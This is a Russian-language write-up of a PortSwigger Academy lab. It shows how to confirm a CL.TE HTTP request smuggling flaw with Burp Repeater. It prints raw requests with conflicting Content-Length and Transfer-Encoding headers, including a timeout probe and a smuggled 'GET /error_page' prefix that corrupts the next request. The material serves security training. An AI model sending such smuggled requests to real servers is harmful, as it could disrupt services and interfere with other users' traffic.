Перейдем на уязвимый ресурс

Перейдем на уязвимый ресурс
Откроем `Proxy` -> `HTTP history`

и отправим в `Repeater` запрос на корневую страницу

Сразу же перейдем на версию HTTP 1.1
и изменим метод запроса на POST 

Тем самым получив такой запрос
```
POST / HTTP/2
Host: 0a8900f00466ac2b81a38f5600c70044.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
и 200 ответ

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/4.%20HTTP%20request%20smuggling%2C%20confirming%20a%20CL.TE%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/1.png)

Далее благодаря пикче давайте проверим что где работает

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/4.%20HTTP%20request%20smuggling%2C%20confirming%20a%20CL.TE%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/2.png)
```
POST / HTTP/1.1
Host: 0a1f000c040f9a138374462d009b00f0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```

И получаем `Timeout` - что означает - `CL.TE` связку

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/4.%20HTTP%20request%20smuggling%2C%20confirming%20a%20CL.TE%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/3.png)

Отлично, далее сконфигурируем запрос

```
POST / HTTP/1.1
Host: 0a8900f00466ac2b81a38f5600c70044.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /error_page HTTP/1.1
X-ignore: X
```

`Причем после X-ignore: X нет \r\n !`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/4.%20HTTP%20request%20smuggling%2C%20confirming%20a%20CL.TE%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/4.png)

и в догонку пошлем 
```
POST / HTTP/1.1
Host: 0a8900f00466ac2b81a38f5600c70044.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/25.%20HTTP%20request%20smuggling/4.%20HTTP%20request%20smuggling%2C%20confirming%20a%20CL.TE%20vulnerability%20via%20differential%20responses/pics%20for%20walkthrough/5.png)

Тем самым, для бекенда наш запрос выглядел как
```
POST / HTTP/1.1
Host: 0a8900f00466ac2b81a38f5600c70044.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /error_page HTTP/1.1
X-ignore: XPOST / HTTP/1.1
Host: 0a8900f00466ac2b81a38f5600c70044.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```
Он заигнорил `X-ignore: XPOST / HTTP/1.1`

и фулл запрос для него стал выглядеть как
```
POST / HTTP/1.1
Host: 0a8900f00466ac2b81a38f5600c70044.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /error_page HTTP/1.1
Host: 0a8900f00466ac2b81a38f5600c70044.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

На что он и выдал ошибку, так как /error_page не существует у него 
